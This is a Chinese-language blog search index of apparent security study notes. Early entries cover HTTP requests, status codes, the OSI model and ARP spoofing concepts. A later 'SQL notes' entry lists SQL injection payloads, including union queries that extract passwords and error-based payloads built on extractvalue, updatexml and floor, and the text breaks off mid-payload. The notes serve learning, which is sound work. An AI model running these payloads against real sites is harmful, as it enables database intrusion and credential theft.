<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>基础知识 二</title>
      <link href="/2021/09/30/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%20%E4%BA%8C/"/>
      <url>/2021/09/30/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%20%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识-二"><a href="#基础知识-二" class="headerlink" title="基础知识  二"></a>基础知识  二</h1><hr><h2 id="1-网络思维模型"><a href="#1-网络思维模型" class="headerlink" title="1. 网络思维模型"></a>1. 网络思维模型</h2><h3 id="架构-（CS-BS）"><a href="#架构-（CS-BS）" class="headerlink" title="架构 （CS / BS）"></a>架构 （CS / BS）</h3><p>CS  (Client  Server)</p><p>BS  (Browser  Server)</p><h4 id="技术架构-CS"><a href="#技术架构-CS" class="headerlink" title="技术架构 CS"></a>技术架构 CS</h4><p>​        Clinent 指的是客户端远方的服务器指的是Server （C就是客户端 / S就是服务端）可以这么简单的去理解</p><h4 id="技术架构-BS"><a href="#技术架构-BS" class="headerlink" title="技术架构 BS"></a>技术架构 BS</h4><p>​        浏览器访问服务器端统称为 BS 架构 也就是某些客户端采用了Web接口 举个例子就相当于是火狐浏览器访问网站; 浏览网站先请求 后响应 </p><h4 id="HTTP协议的交互过程"><a href="#HTTP协议的交互过程" class="headerlink" title="HTTP协议的交互过程"></a>HTTP协议的交互过程</h4><p>​        客户端 请求 服务端 端口请求 </p><p>​        四步请求（建立链接 请求链接 响应链接 关闭链接 ）</p><h4 id="什么是-HTTP-协议"><a href="#什么是-HTTP-协议" class="headerlink" title="什么是 HTTP 协议"></a>什么是 HTTP 协议</h4><table><thead><tr><th align="center">分层理解-Layered</th><th align="center">层级描述-Description</th></tr></thead><tbody><tr><td align="center">静态层</td><td align="center">Javascrip、html</td></tr><tr><td align="center">脚本层</td><td align="center">PHP、ASPX、ASP、JSP</td></tr><tr><td align="center">数据层</td><td align="center">MySQL、Oracle、Access、SQL Server、Postgresql……</td></tr><tr><td align="center">服务层</td><td align="center">Nginx、Apache、IIS</td></tr><tr><td align="center">系统层</td><td align="center">Windows、Linux</td></tr></tbody></table><h2 id="2-局域网的简单通信"><a href="#2-局域网的简单通信" class="headerlink" title="2. 局域网的简单通信"></a>2. 局域网的简单通信</h2><p>​         一般局域网都通过交换机/路由通信，古老的网络中大部分都使用HUB(集线器)其缺点就是主机发送的每一个数据包，都会被其他主机接收到，这个过程叫泛洪。<br>​        在此基础上，交换机保留了集线器的功能，进行更安全的功能开发，那就是通过MAC地址表进行数据调整转发。<br>​        交换机中的主机通信过程 :<br>​        ARP广播<br>​        接收响应<br>        发送数据  ==&gt; 交换机转发并且记录 MAC地址，如果MAC地址表被填满，将会泛洪(ARP毒化)。<br>​        ARP欺骗 ==&gt; 回应每一个请求。</p><h2 id="3-OSI七层模型"><a href="#3-OSI七层模型" class="headerlink" title="3. OSI七层模型"></a>3. OSI七层模型</h2><p>​        国际标准化组织(ISO)和国际电报电话咨询委员会(CCITT)联合制定的开放系统互连参考模型，为开放式互连信息系统提供了一种功能结构的框架。它从低到高分别是:物理层、数据链路层、网络层、传输层、会话层、表示层和应用层。</p><h3 id="层级对应协议："><a href="#层级对应协议：" class="headerlink" title="层级对应协议："></a>层级对应协议：</h3><table><thead><tr><th align="left">OSI七层架构模型</th></tr></thead><tbody><tr><td align="left">7. 应用层 - 我们的HTTP协议、DNS</td></tr><tr><td align="left">6. 表示层 - 进行数据编码、解码</td></tr><tr><td align="left">5. 会话层 - 建立通信连接 (ADSL拨号)</td></tr><tr><td align="left">4. 传输层 - TCP/IP协议控制数据传输</td></tr><tr><td align="left">3. 网络层 - 路由转发  (IP)</td></tr><tr><td align="left">2. 数据链路层 - 交换机物理寻址 (MAC)</td></tr><tr><td align="left">1. 物理层 - 网卡比特流 (bit)</td></tr></tbody></table><h2 id="4-自身安全"><a href="#4-自身安全" class="headerlink" title="4. 自身安全"></a>4. 自身安全</h2><p>   <strong>切莫与国法硬碰硬 谨遵网络安全法</strong></p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础知识 一</title>
      <link href="/2021/09/30/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%20%E4%B8%80/"/>
      <url>/2021/09/30/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%20%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识-一"><a href="#基础知识-一" class="headerlink" title="基础知识 一"></a>基础知识 一</h1><hr><h2 id="什么是HTTP请求"><a href="#什么是HTTP请求" class="headerlink" title="什么是HTTP请求"></a>什么是HTTP请求</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">HTTP协议（Hyper Text Transfer Protocol，超文本传输协议）是用于从WWW服务器传输文本到本地浏览器的传输协议。它可以使浏览器更加高效，使网络传输减少。它不仅保证计算机正确快速地传输超文本文档，嗐确定传输文档中的哪一部分，以及那部分内容首先显示（如文本先于图像）等。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="常见的请求"><a href="#常见的请求" class="headerlink" title="常见的请求"></a>常见的请求</h3><h4 id="GET-请求"><a href="#GET-请求" class="headerlink" title="GET 请求"></a>GET 请求</h4><p>​        最常见的一种请求方式，当客户端要从服务器中读取文档时，当点击网页上的链接或者通过在浏览器的地址栏输入网址来浏览网页的，使用的都是GET方式。GET方法要求服务器将URL定位的资源放在响应报文的数据部分，回送给客户端。使用GET方法时，请求参数和对应的值附加在URL后面，利用一个问号（“?”）代表URL的结尾与请求参数的开始，传递参数长度受限制。例如，/index.jsp?id=100&amp;op=bind,这样通过GET方式传递的数据直接表示在地址中，所以我们可以把请求结果以链接的形式发送给好友。以用google搜索domety为例，Request格式如下：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/search?hl=zh-CN&amp;source=hp&amp;q=domety&amp;aq=f&amp;oq=</span> <span class="token http-version property">HTTP/1.1</span></span>    <span class="token header-name keyword">Accept:</span> image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint,   application/msword, application/x-silverlight, application/x-shockwave-flash, */*    <span class="token header-name keyword">Referer:</span> &lt;a href="http://www.google.cn/">http://www.google.cn/&lt;/a>    <span class="token header-name keyword">Accept-Language:</span> zh-cn    <span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate    <span class="token header-name keyword">User-Agent:</span> Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; TheWorld)    <span class="token header-name keyword">Host:</span> &lt;a href="http://www.google.cn">www.google.cn&lt;/a>    <span class="token header-name keyword">Connection:</span> Keep-Alive    <span class="token header-name keyword">Cookie:</span> PREF=ID=80a06da87be9ae3c:U=f7167333e2c3b714:NW=1:TM=1261551909:LM=1261551917:S=ybYcq2wpfefs4V9g;   NID=31=ojj8d-IygaEtSxLgaJmqSjVhCspkviJrB6omjamNrSm8lZhKy_yMfO2M4QMRKcH1g0iQv9u-2hfBW7bUFwVh7pGaRUb0RnHcJU37y-  FxlRugatx63JLv7CWMD6UB_O_r  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="POST-请求"><a href="#POST-请求" class="headerlink" title="POST 请求"></a>POST 请求</h4><p>​        对于上面提到的不适合使用GET方式的情况，可以考虑使用POST方式，因为使用POST方法可以允许客户端给服务器提供信息较多。POST方法将请求参数封装在HTTP请求数据中，以名称/值的形式出现，可以传输大量数据，这样POST方式对传送的数据大小没有限制，而且也不会显示在URL中。还以上面的搜索domety为例，如果使用POST方式的话，格式如下：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/search</span> <span class="token http-version property">HTTP/1.1</span></span>    <span class="token header-name keyword">Accept:</span> image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint,   application/msword, application/x-silverlight, application/x-shockwave-flash, */*    <span class="token header-name keyword">Referer:</span> &lt;a href="http://www.google.cn/">http://www.google.cn/&lt;/a>    <span class="token header-name keyword">Accept-Language:</span> zh-cn    <span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate    <span class="token header-name keyword">User-Agent:</span> Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; TheWorld)    <span class="token header-name keyword">Host:</span> &lt;a href="http://www.google.cn">www.google.cn&lt;/a>    <span class="token header-name keyword">Connection:</span> Keep-Alive    <span class="token header-name keyword">Cookie:</span> PREF=ID=80a06da87be9ae3c:U=f7167333e2c3b714:NW=1:TM=1261551909:LM=1261551917:S=ybYcq2wpfefs4V9g;   NID=31=ojj8d-IygaEtSxLgaJmqSjVhCspkviJrB6omjamNrSm8lZhKy_yMfO2M4QMRKcH1g0iQv9u-2hfBW7bUFwVh7pGaRUb0RnHcJU37y-  FxlRugatx63JLv7CWMD6UB_O_r      hl=zh-CN&amp;source=hp&amp;q=domety  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="GET请求和POST请求的区别"><a href="#GET请求和POST请求的区别" class="headerlink" title="GET请求和POST请求的区别"></a>GET请求和POST请求的区别</h5><h6 id="浏览器角度"><a href="#浏览器角度" class="headerlink" title="浏览器角度"></a>浏览器角度</h6><p>​        浏览器限制GET的长度，但是不限制提交的POST长度<br>​        POST的长度取决于服务器端的配置</p><h6 id="数据接收方式"><a href="#数据接收方式" class="headerlink" title="数据接收方式"></a>数据接收方式</h6><p>​        GET是通过浏览器地址栏传递数据，POST是通过浏览器隐式提交数据(刷新页面)</p><h6 id="用途角度"><a href="#用途角度" class="headerlink" title="用途角度"></a>用途角度</h6><p>​        发送登录请求均使用POST<br>​        提交发送搜索请求均使用GET提交</p><h4 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h4><p>​        PUT 向网页写入文件</p><h4 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h4><p>​        COPY 复制文件</p><h4 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h4><p>​        DELETE 删除</p><h4 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><p>​        OPTIONS 返回请求方式</p><h4 id="解析GET请求"><a href="#解析GET请求" class="headerlink" title="解析GET请求"></a>解析GET请求</h4><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">GET/HTTP/1.1 -- 请求方式Host：stentqh.geithub.io -- 请求地址User-Agent:Mozilla/5.0(windows NT 10.0 WOW64; rv:51.0)# 请求的设备（返回电脑页面或者手机页面）Accept:xml/html text -- 页面上传Accept-Language：zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 # 语言 中文、英文Accept-Encoding: gzip,deflate -- 传输压缩Cookie:code=bd60dd1ee8009d95677xxxx; -- CookieConnection:keep-alive -- Cookie存活多久<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="常见的HTTP状态码"><a href="#常见的HTTP状态码" class="headerlink" title="常见的HTTP状态码"></a>常见的HTTP状态码</h2><p>​        当浏览者访问一个网页时，浏览者的浏览器会向网页所在服务器发出请求。当浏览器接收并显示网页前，此网页所在的服务器会返回一个包含HTTP状态码的信息头（server header）用以响应浏览器的请求。<br>HTTP状态码的英文为HTTP Status Code。状态代码由三位数字组成，第一个数字定义了响应的类别，且有五种可能取值。</p><ul><li>1xx：指示信息–表示请求已接收，继续处理。</li><li>2xx：成功–表示请求已被成功接收、理解、接受。</li><li>3xx：重定向–要完成请求必须进行更进一步的操作。</li><li>4xx：客户端错误–请求有语法错误或请求无法实现。</li><li>5xx：服务器端错误–服务器未能实现合法的请求。</li></ul><h3 id="常见状态代码、状态描述的说明"><a href="#常见状态代码、状态描述的说明" class="headerlink" title="常见状态代码、状态描述的说明"></a>常见状态代码、状态描述的说明</h3><ul><li>200 OK：客户端请求成功。</li><li>400 Bad Request：客户端请求有语法错误，不能被服务器所理解。</li><li>401 Unauthorized：请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用。</li><li>403 Forbidden：服务器收到请求，但是拒绝提供服务。</li><li>404 Not Found：请求资源不存在，举个例子：输入了错误的URL。</li><li>500 Internal Server Error：服务器发生不可预期的错误。</li><li>503 Server Unavailable：服务器当前不能处理客户端的请求，一段时间后可能恢复正常，举个例子：HTTP/1.1 200 OK（CRLF）。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL 笔记</title>
      <link href="/2021/09/30/SQL/"/>
      <url>/2021/09/30/SQL/</url>
      
        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><h5 id="OWASP-TOP-10"><a href="#OWASP-TOP-10" class="headerlink" title="OWASP TOP 10"></a>OWASP TOP 10</h5><p>可以去网站查看 <a href="https://owasp.org/Top10/">OWASP 前 10：2021</a></p><h4 id="SQL常用函数"><a href="#SQL常用函数" class="headerlink" title="SQL常用函数"></a>SQL常用函数</h4><table><thead><tr><th align="center">函数名称</th><th align="center">函数说明及使用</th></tr></thead><tbody><tr><td align="center">MID（要截取的字符串，起始位置，结束位置）</td><td align="center">截取字符串</td></tr><tr><td align="center">CHAR(ASCII)</td><td align="center">返回ASCII码对应的字符</td></tr><tr><td align="center">ASCII(字符)</td><td align="center">返回字符对应的ASCII码</td></tr><tr><td align="center">IF(逻辑表达式,返回1，2)</td><td align="center">if</td></tr><tr><td align="center">SUBSTR（同MID）</td><td align="center">同MID</td></tr><tr><td align="center">LENGTH（字符串）</td><td align="center">返回字符串长度</td></tr><tr><td align="center">COUT(列名)</td><td align="center">返回当前列名下有效记录数</td></tr><tr><td align="center">SLEEP(s)</td><td align="center">沉睡XXX秒，数字类型，可自定义</td></tr><tr><td align="center">#  /**/  –</td><td align="center">–+</td></tr><tr><td align="center">CONCAT(字符串1，字符串2…)</td><td align="center">拼接字符</td></tr><tr><td align="center">LOAD_FILE（文件名）</td><td align="center">读取文件</td></tr><tr><td align="center">INTO OUTFILE “文件名称”</td><td align="center">输出</td></tr></tbody></table><h4 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql <span class="token operator">-</span>u xxx <span class="token operator">-</span> p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="查看版本号"><a href="#查看版本号" class="headerlink" title="查看版本号"></a>查看版本号</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql <span class="token operator">-</span>h host <span class="token operator">-</span>u username <span class="token operator">-</span>p password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><h5 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h5><p>SQL注入分类：</p><ul><li>回显正常—&gt; 联合查询 union select</li><li>回显报错—&gt; Duplicate entry()<pre><code>       extractvalue()</code></pre>  　　       updatexml()</li><li>盲注    —&gt;布尔型盲注<pre><code>       基于时间的盲注sleep()</code></pre></li></ul><h5 id="基本查询"><a href="#基本查询" class="headerlink" title="基本查询"></a>基本查询</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token keyword">status</span><span class="token punctuation">;</span> <span class="token comment">/*(order by x)*/</span><span class="token comment">--列</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">/*0,password,0*/</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>password<span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span>xxx<span class="token punctuation">;</span><span class="token comment">/*跨库 要root*/</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">or</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">select</span> xxxx <span class="token keyword">from</span> xxxx<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">;</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token comment">/*表名*/</span> <span class="token keyword">from</span> <span class="token comment">/*库名*/</span><span class="token keyword">tables</span><span class="token comment">/*    例子        select table_schema from information_schema.tables             union select1,2,3,select table_name from nformation_schema.tables where table_schema='jokerDB'       解析：从information_scheam数据库的table_schema列名获取jokerDB 在进行约束    union select1,2,3,select table_name from nformation_schema.tables where table_schema='jokerDB' and tabke_name='uers'       查询你认为可能像密码的表*/</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>password <span class="token keyword">from</span> xxx<span class="token punctuation">;</span><span class="token comment">/*字符填充 防止报错*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//查看版本</span><span class="token keyword">set</span> xxxx gdk <span class="token comment">//编码 首先的知道编码</span><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span> <span class="token comment">//查看数据库</span><span class="token keyword">create</span> datase test<span class="token punctuation">;</span> <span class="token comment">//新建数据库test</span><span class="token keyword">use</span> test<span class="token punctuation">;</span> <span class="token comment">//使用数据库</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token punctuation">;</span> <span class="token comment">//查看表</span><span class="token comment">// 创建表</span><span class="token keyword">create</span> <span class="token keyword">table</span> xxxx<span class="token punctuation">(</span>id <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token keyword">auto_increment</span><span class="token punctuation">,</span> username <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>password <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token keyword">primary</span> ker<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//查看字段类型</span><span class="token keyword">show</span> <span class="token keyword">full</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> xxxx<span class="token punctuation">;</span><span class="token comment">//插入数据</span><span class="token keyword">insert</span> <span class="token keyword">into</span> xxxx<span class="token punctuation">(</span>username<span class="token punctuation">.</span>password<span class="token punctuation">)</span> <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">,</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span><span class="token comment">//查看数据</span><span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span> xxxx<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h4><h5 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//常规注入 </span>php? id<span class="token operator">=</span><span class="token number">1</span>php? id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>?id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">or</span> <span class="token string">'s'</span><span class="token operator">=</span><span class="token string">'s'</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//联合注入</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxx<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> xxxx <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token keyword">from</span> admin<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> xxxx 列名<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token keyword">from</span> admin<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">exists</span><span class="token punctuation">(</span>xxxx username <span class="token keyword">from</span> admin<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="常用十大报错函数"><a href="#常用十大报错函数" class="headerlink" title="常用十大报错函数"></a>常用十大报错函数</h5><h6 id="1-floor"><a href="#1-floor" class="headerlink" title="1. floor()"></a>1. floor()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sel <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2. extractvalue()"></a>2. extractvalue()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span><span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="3-updatexml"><a href="#3-updatexml" class="headerlink" title="3. updatexml()"></a>3. updatexml()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span><span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="4-geometrycollection"><a href="#4-geometrycollection" class="headerlink" title="4.geometrycollection()"></a>4.geometrycollection()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">geometrycollection</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="5-multipoint"><a href="#5-multipoint" class="headerlink" title="5. multipoint()"></a>5. multipoint()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">multipoint</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="6-polygon"><a href="#6-polygon" class="headerlink" title="6. polygon()"></a>6. polygon()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">polygon</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="7-multipolygon"><a href="#7-multipolygon" class="headerlink" title="7.multipolygon()"></a>7.multipolygon()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">multipolygon</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token 